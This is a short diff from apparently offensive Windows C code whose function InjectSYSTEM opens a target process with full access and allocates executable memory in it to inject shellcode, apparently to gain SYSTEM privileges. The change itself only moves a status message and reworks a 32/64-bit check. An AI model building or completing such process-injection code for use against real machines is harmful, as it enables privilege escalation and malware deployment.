@@ -311,7 +311,7 @@ DWORD InjectSYSTEM(char* TarPorcess) {
 		_FormatErrorMessage("[-] Could not find process");
 		return -1;
 	}
-	printf("[*] Injecting shellcode in %s ...\n", TarPorcess);
+	
 
 	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 	if (hProc == NULL) {
@@ -321,14 +321,15 @@ DWORD InjectSYSTEM(char* TarPorcess) {
 
 	// 都是x86或者x64时才进行注入，不同 时 使用其他注入方法
 	if ( !(IsWow64(hProc) ^ IsWow64(GetCurrentProcess())) ) {
+		printf("[*] Injecting shellcode in %s ...\n", TarPorcess);
+	}
+	else {
 		///
 		/// 32位注入64位
 		/// 
-	}
-	else {
 		return -1;
 	}
-		
+	
 	LPVOID lpMem = VirtualAllocEx(hProc, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (lpMem == NULL) {
 		_FormatErrorMessage("[-] Remote allocation failed");
